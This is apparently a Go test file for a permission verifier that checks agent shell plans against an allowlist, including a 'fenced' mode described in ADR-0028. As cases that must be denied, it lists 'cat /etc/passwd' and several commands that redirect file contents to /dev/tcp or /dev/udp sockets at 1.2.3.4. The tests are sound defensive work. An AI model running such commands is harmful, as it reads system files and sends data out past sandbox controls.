package verify

import (
	"strconv"
	"strings"
	"testing"
)

// ADR-0028: a fenced verify keeps the shell-access findings out of the
// violations, as warnings, and keeps every other check.
func TestVerifyFencedRecordsShellAccesses(t *testing.T) {
	env, err := ParseEnvelope([]byte(`{"generated_by":"t","task":"t","permissions":{"file_read":["/work/**"],"file_write":["/work/**"],"shell":true,"shell_allowlist":["git","ls"]}}`))
	if err != nil {
		t.Fatal(err)
	}
	plan := func(cmd string) ActionPlan {
		p, err := ParsePlan([]byte(`{"source":"t","task":"t","steps":[{"id":"s","type":"shell","command":` + strconv.Quote(cmd) + `}]}`))
		if err != nil {
			t.Fatal(err)
		}
		return p
	}
	base := "/work"
	git := plan("git -c user.name=x commit -m m")
	if r := Verify(git, env, VerifyOptions{Z3TimeoutMs: 500, DialectBase: &base}); r.OK {
		t.Fatal("unfenced must deny")
	}
	r := Verify(git, env, VerifyOptions{Z3TimeoutMs: 500, DialectBase: &base, Fenced: true})
	if !r.OK || len(r.Warnings) == 0 || !strings.HasPrefix(r.Warnings[0], FencePrefix) {
		t.Fatalf("fenced must allow and record: %+v", r)
	}
	if r := Verify(plan("cat /etc/passwd"), env, VerifyOptions{Z3TimeoutMs: 500, DialectBase: &base, Fenced: true}); r.OK {
		t.Fatal("a head outside the allowlist must still deny")
	}
}

// The fence does not limit the network: /dev/tcp and /dev/udp decide the
// same fenced and unfenced, with decomposition on and off (ADR-0028).
func TestVerifyFencedStillDeniesANetDevice(t *testing.T) {
	for _, decompose := range []string{"true", "false"} {
		env, err := ParseEnvelope([]byte(`{"generated_by":"t","task":"t","permissions":{"file_read":["/work/**"],"file_write":["/work/**"],"shell":true,"shell_allowlist":["cat"],"shell_allow_decomposition":` + decompose + `}}`))
		if err != nil {
			t.Fatal(err)
		}
		base := "/work"
		for _, cmd := range []string{
			"cat a.txt > /dev/tcp/1.2.3.4/80",
			"cat a.txt >> /dev/udp/1.2.3.4/53",
			"cat < /dev/tcp/1.2.3.4/80",
			"cat a.txt | cat > '/dev/tcp/1.2.3.4/80'",
			"cat /dev/tcp/1.2.3.4/80",
		} {
			p, err := ParsePlan([]byte(`{"source":"t","task":"t","steps":[{"id":"s","type":"shell","command":` + strconv.Quote(cmd) + `}]}`))
			if err != nil {
				t.Fatal(err)
			}
			if r := Verify(p, env, VerifyOptions{Z3TimeoutMs: 500, DialectBase: &base}); r.OK {
				t.Fatalf("unfenced must deny %q (decomposition %s)", cmd, decompose)
			}
			if r := Verify(p, env, VerifyOptions{Z3TimeoutMs: 500, DialectBase: &base, Fenced: true}); r.OK {
				t.Fatalf("fenced must deny %q (decomposition %s): %+v", cmd, decompose, r)
			}
		}
	}
}
